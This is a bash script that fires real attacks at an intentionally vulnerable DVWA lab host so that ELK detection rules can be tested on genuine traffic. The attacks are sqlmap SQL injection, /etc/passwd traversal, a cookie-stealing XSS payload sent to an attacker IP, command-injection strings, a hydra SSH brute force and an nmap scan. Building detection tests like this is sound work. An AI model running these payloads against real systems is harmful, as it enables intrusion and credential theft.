#!/usr/bin/env bash
#
# attack_dvwa.sh - drive six real attacks against the CyREN lab DVWA target
# using industry-standard tools, so ELK detection rules fire on genuine
# attack traffic instead of hand-written fake payloads.
#
#   Attacker : Kali (this host), source-IP aliased to .104 / .150 / .151
#   Target   : DVWA on the isolated Host-Only network (default 192.168.56.101)
#
# Tools: sqlmap (SQLi), curl (XSS / command injection / file inclusion),
#        hydra (SSH brute force), nmap (port scan).
#
# SAFETY: this only runs against a private (RFC1918) address on the
# Host-Only lab subnet. It refuses any public target. Use exclusively on
# infrastructure you own and are authorised to test.
#
# Usage:
#   ./attack_dvwa.sh                 # attack the default target, all phases
#   TARGET=192.168.56.101 ./attack_dvwa.sh
#   ./attack_dvwa.sh --only ssh      # run one attack (sqli|xss|cmd|fi|ssh|scan)
#   ./attack_dvwa.sh --src 192.168.56.200 --only sqli   # one attack from a chosen source IP
#   ./attack_dvwa.sh --yes           # skip the confirmation prompt
#
set -uo pipefail

# ----------------------------------------------------------------- config
TARGET="${TARGET:-192.168.56.101}"        # DVWA victim
IFACE="${IFACE:-eth0}"                     # Kali interface on the 56.0/24 net
DVWA_USER="${DVWA_USER:-admin}"
DVWA_PASS="${DVWA_PASS:-password}"

# attacker source IPs (aliases added to $IFACE). Six attacks are spread
# across the three so CyREN sees multiple sources and can correlate chains.
# Each is overridable via env, e.g. IP_A=192.168.56.200 ./attack_dvwa.sh
IP_A="${IP_A:-192.168.56.104}"     # SQL injection + file inclusion
IP_B="${IP_B:-192.168.56.150}"     # XSS + command injection
IP_C="${IP_C:-192.168.56.151}"     # SSH brute force + port scan
# SRC (env or --src) overrides the source IP for EVERY attack in this run - use
# it together with --only to fire one chosen attack from one chosen source IP.
# Empty = use the per-attack IPs above.
SRC="${SRC:-}"
ALIASES=("$IP_A" "$IP_B" "$IP_C")

COOKIE_JAR="$(mktemp)"
ONLY=""
ASSUME_YES=0

# ------------------------------------------------------------- pretty print
c_ok()   { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_info() { printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; }
phase()  { printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }

# --------------------------------------------------------------- arg parse
while [ $# -gt 0 ]; do
  case "$1" in
    --only) ONLY="$2"; shift 2 ;;
    --src)  SRC="$2"; shift 2 ;;
    --yes)  ASSUME_YES=1; shift ;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) c_err "unknown argument: $1"; exit 2 ;;
  esac
done

# a chosen source IP applies to every phase; alias only that one address
if [ -n "$SRC" ]; then
  case "$SRC" in
    10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*) : ;;
    *) c_err "SRC $SRC is not a private lab address. Refusing."; exit 1 ;;
  esac
  ALIASES=("$SRC")
fi

# ------------------------------------------------------------ safety checks
case "$TARGET" in
  10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*) : ;;
  *) c_err "TARGET $TARGET is not a private lab address. Refusing to run."; exit 1 ;;
esac

need() { command -v "$1" >/dev/null 2>&1 || { c_err "missing tool: $1 (apt install $2)"; MISSING=1; }; }
MISSING=0
need curl curl
need sqlmap sqlmap
need hydra hydra
need nmap nmap
[ "$MISSING" = 1 ] && { c_err "install the tools above and re-run."; exit 1; }

if [ "$(id -u)" -ne 0 ]; then
  c_err "run as root (needed for IP aliasing and source routing): sudo $0"
  exit 1
fi

echo
c_warn "CyREN lab attack simulation"
c_warn "  attacker : $(hostname) via $IFACE, aliased to ${ALIASES[*]}"
c_warn "  target   : $TARGET (DVWA)"
c_warn "  attacks  : SQLi(sqlmap) XSS(curl) CmdInj(curl) FI(curl) SSH(hydra) Scan(nmap)"
if [ "$ASSUME_YES" != 1 ]; then
  read -r -p "This generates real attack traffic against $TARGET. Continue? [y/N] " ans
  [ "$ans" = "y" ] || [ "$ans" = "Y" ] || { c_info "aborted."; exit 0; }
fi

# --------------------------------------------------- source-IP aliasing
# One `ip route ... src` change controls the source address for every tool
# that connects to the target (sqlmap, hydra and connect-scan nmap all use
# the OS socket stack), so we do not need per-tool source-bind flags.
ORIG_ROUTE="$(ip route get "$TARGET" 2>/dev/null | head -1 || true)"

setup_aliases() {
  for ip in "${ALIASES[@]}"; do
    ip addr add "$ip/24" dev "$IFACE" 2>/dev/null && c_info "added alias $ip" || true
  done
}

use_source() {   # route traffic to the target out of a chosen alias
  local src="$1"
  ip route replace "$TARGET" dev "$IFACE" src "$src"
  c_info "source IP for this phase: $src"
}

cleanup() {
  c_info "cleaning up aliases and route"
  ip route replace "$TARGET" dev "$IFACE" 2>/dev/null || true
  for ip in "${ALIASES[@]}"; do ip addr del "$ip/24" dev "$IFACE" 2>/dev/null || true; done
  rm -f "$COOKIE_JAR" "$PASSLIST" 2>/dev/null || true
}
trap cleanup EXIT

# ------------------------------------------------------- DVWA authentication
# The vulnerable modules require a logged-in session at security level "low".
# Grab the CSRF token, log in, then lower the security level.
dvwa_token() { # $1 = page path
  curl -s -b "$COOKIE_JAR" "http://$TARGET/$1" \
    | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1
}

dvwa_login() {
  local t
  t="$(curl -s -c "$COOKIE_JAR" "http://$TARGET/dvwa/login.php" \
       | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1)"
  curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -o /dev/null \
       --data "username=$DVWA_USER&password=$DVWA_PASS&Login=Login&user_token=$t" \
       "http://$TARGET/dvwa/login.php"
  t="$(dvwa_token dvwa/security.php)"
  curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -o /dev/null \
       --data "security=low&seclevel=low&user_token=$t" \
       "http://$TARGET/dvwa/security.php"
  local sid
  sid="$(grep -i PHPSESSID "$COOKIE_JAR" | awk '{print $NF}' | tail -1)"
  if [ -z "$sid" ]; then
    c_err "DVWA login failed (no session cookie). Is DVWA set up and reachable at http://$TARGET/dvwa/ ?"
    return 1
  fi
  DVWA_SID="$sid"
  c_ok "authenticated to DVWA (PHPSESSID=${sid:0:8}..., security=low)"
}

# ---------------------------------------------------------------- attacks
attack_sqli() {
  phase "SQL Injection - sqlmap real UNION/boolean injection"
  dvwa_login || return 1
  # --technique=BEU exercises boolean, error and UNION injection; every
  # request carries the /dvwa/vulnerabilities/sqli/ path the rule matches.
  sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=$DVWA_SID; security=low" \
    --batch --flush-session --level=2 --risk=2 --technique=BEU \
    --dbs --threads=2 || c_warn "sqlmap returned non-zero (traffic was still sent)"
  c_ok "SQLi traffic sent"
}

attack_fi() {
  phase "File Inclusion - path traversal payloads"
  dvwa_login || return 1
  for p in "../../../../etc/passwd" "....//....//etc/passwd" \
           "/etc/passwd" "http://127.0.0.1/dvwa/robots.txt"; do
    curl -s -b "$COOKIE_JAR" -o /dev/null \
      "http://$TARGET/dvwa/vulnerabilities/fi/?page=$p"
  done
  c_ok "File Inclusion traffic sent"
}

attack_xss() {
  phase "XSS (reflected) - real <script> payloads"
  dvwa_login || return 1
  for p in "<script>alert(1)</script>" \
           "<script>document.location='http://$IP_B/c?'+document.cookie</script>" \
           "<img src=x onerror=alert(document.domain)>" \
           "<svg/onload=alert(1)>"; do
    curl -s -b "$COOKIE_JAR" -o /dev/null -G \
      --data-urlencode "name=$p" --data "Submit=Submit" \
      "http://$TARGET/dvwa/vulnerabilities/xss_r/"
  done
  c_ok "XSS traffic sent"
}

attack_cmd() {
  phase "Command Injection - shell metacharacter payloads"
  dvwa_login || return 1
  for p in "127.0.0.1;id" "127.0.0.1|whoami" "127.0.0.1&&uname -a" \
           "127.0.0.1;cat /etc/passwd"; do
    curl -s -b "$COOKIE_JAR" -o /dev/null \
      --data-urlencode "ip=$p" --data "Submit=Submit" \
      "http://$TARGET/dvwa/vulnerabilities/exec/"
  done
  c_ok "Command Injection traffic sent"
}

attack_ssh() {
  phase "SSH Brute Force - hydra"
  PASSLIST="$(mktemp)"
  printf '%s\n' 123456 password admin root toor letmein qwerty \
    dvwa password123 P@ssw0rd changeme > "$PASSLIST"
  # >5 wrong passwords in a short burst trips the threshold rule; sshd logs
  # "Failed password ... from <source-ip>" which the rule keys on.
  hydra -l "sysadmin" -P "$PASSLIST" -t 4 -f -o /dev/null \
    "ssh://$TARGET" || c_warn "hydra finished (expected: no valid login)"
  c_ok "SSH brute force traffic sent"
}

attack_scan() {
  phase "Port Scan - nmap TCP connect scan"
  # -sT uses the OS socket stack so it honours the source-IP route and trips
  # the target's iptables PORTSCAN log (see lab/target_setup.sh).
  nmap -sT -p 1-1000 --min-rate 400 -Pn "$TARGET" || c_warn "nmap returned non-zero"
  c_ok "Port scan traffic sent"
}

# ------------------------------------------------------------------- run
setup_aliases

run_phase() { # $1 = source ip, rest = attack functions
  local src="${SRC:-$1}"; shift
  use_source "$src"
  for fn in "$@"; do
    if [ -z "$ONLY" ] || [ "$ONLY" = "${fn#attack_}" ]; then
      "$fn"
    fi
  done
}

run_phase "$IP_A" attack_sqli attack_fi
run_phase "$IP_B" attack_xss attack_cmd
run_phase "$IP_C" attack_ssh attack_scan

phase "Done"
c_ok "All requested attacks sent. Check Kibana (Security > Alerts) and CyREN."
c_info "Detection rules must match the URL paths / keywords these produce -"
c_info "see lab/README_lab.md for the exact rule queries."
